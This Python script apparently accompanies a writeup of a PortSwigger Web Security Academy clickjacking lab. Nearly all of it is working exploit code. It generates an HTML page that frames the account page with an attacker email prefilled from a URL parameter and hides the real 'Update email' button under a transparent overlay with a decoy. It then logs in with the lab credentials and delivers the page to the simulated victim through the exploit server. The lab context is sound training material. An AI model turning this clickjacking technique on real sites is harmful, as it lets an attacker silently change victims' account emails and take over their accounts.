#!/usr/bin/env python3
"""
Clickjacking with form input data prefilled from a URL parameter
PortSwigger Web Security Academy -- Clickjacking

Companion script for the writeup: 02-clickjacking-with-form-input-data-prefilled-from-a-url-parameter.md

What this does:
    Frames /my-account with the attacker's email already sitting in the iframe's
    src as a query parameter (?email=hacker@evil-user.net), so the "Update email"
    form is pre-populated by the server before the victim ever sees the page. A
    transparent decoy is placed over the real "Update email" button; the victim's
    click submits the form with their own valid session and CSRF token, changing
    their account email to the attacker-controlled address. Delivered through the
    lab's own exploit server to the simulated victim.

    The 500px/60px overlay offset was measured directly against the "Update email"
    button's getBoundingClientRect() at the same 500px iframe width used here (see
    the writeup). It's hardcoded rather than re-measured at runtime because
    PortSwigger's lab template renders this page identically across every lab
    instance -- only the subdomain changes, not the layout -- so the coordinates
    transfer as-is.

Usage:
    python 02-clickjacking-with-form-input-data-prefilled-from-a-url-parameter.py <lab-url>
    e.g. python 02-clickjacking-with-form-input-data-prefilled-from-a-url-parameter.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install websockets   # optional -- fallback for exploit-server URL discovery
"""

import re
import sys
import time
import pathlib
import urllib.parse
import httpx

DECOY_TEXT = "click me"
BTN_TOP = 500
BTN_LEFT = 60
IFRAME_WIDTH = 500
IFRAME_HEIGHT = 700
OPACITY = 0.00001
ATTACKER_EMAIL = "hacker@evil-user.net"


def _get_csrf(client: httpx.Client, path: str = "/login") -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'name=csrf\s+value=([^\s>]+)', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> bool:
    csrf = _get_csrf(client, "/login")
    r = client.post("/login", data={"csrf": csrf, "username": username, "password": password})
    return r.status_code < 400 and "Log out" in r.text


def _get_exploit_server_url(client: httpx.Client) -> str | None:
    """Find the exploit server URL embedded in the lab page (static HTML, then WebSocket header)."""
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    if m:
        return m.group(1).rstrip("/")

    base = str(client.base_url).rstrip("/")
    ws_url = base.replace("https://", "wss://").replace("http://", "ws://") + "/academyLabHeader"
    try:
        import websockets.sync.client as ws_sync
        with ws_sync.connect(ws_url, close_timeout=5) as ws:
            data = ws.recv(timeout=5)
            m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', str(data))
            if m:
                return m.group(1).rstrip("/")
    except Exception:
        pass
    return None


def _deliver_to_victim(exploit_url: str, html: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": html,
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def build_exploit_html(target_url: str) -> str:
    qs = urllib.parse.urlencode({"email": ATTACKER_EMAIL})
    sep = "&" if "?" in target_url else "?"
    iframe_src = f"{target_url}{sep}{qs}"

    return (
        "<style>\n"
        "  body { margin: 0; padding: 0; }\n"
        f"  iframe {{ position: relative; width: {IFRAME_WIDTH}px; height: {IFRAME_HEIGHT}px; "
        f"opacity: {OPACITY}; z-index: 2; }}\n"
        f"  .decoy {{ position: absolute; top: {BTN_TOP}px; left: {BTN_LEFT}px; z-index: 1; "
        "font-size: 20px; cursor: pointer; }\n"
        "</style>\n"
        f'<div class="decoy">{DECOY_TEXT}</div>\n'
        f'<iframe src="{iframe_src}"></iframe>'
    )


def solve(lab_url: str) -> None:
    target = f"{lab_url}/my-account"

    r = httpx.get(target, follow_redirects=True, timeout=20)
    print(f"[*] {target} -- X-Frame-Options: {r.headers.get('x-frame-options', '(not set)')}")

    html = build_exploit_html(target)
    out_path = pathlib.Path(__file__).with_suffix(".html")
    out_path.write_text(html, encoding="utf-8")
    print(f"[+] Exploit HTML written to {out_path}")

    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20,
                           headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    client.get("/")  # warm up, grab session cookie

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] Could not find the exploit server URL -- open the lab in a browser once first.")
        return

    if not _login(client):
        print("[-] Login as wiener/peter failed -- the account victim session may not be primed.")

    print(f"[*] Delivering exploit via {exploit_url} ...")
    if not _deliver_to_victim(exploit_url, html):
        print("[-] Delivery to exploit server failed.")
        return

    time.sleep(5)
    check = client.get("/")
    if "Congratulations" in check.text:
        print(f"[+] Lab solved -- the victim's account email was changed to {ATTACKER_EMAIL}.")
    else:
        print("[-] Not solved yet -- verify the exploit server actually delivered to the victim.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
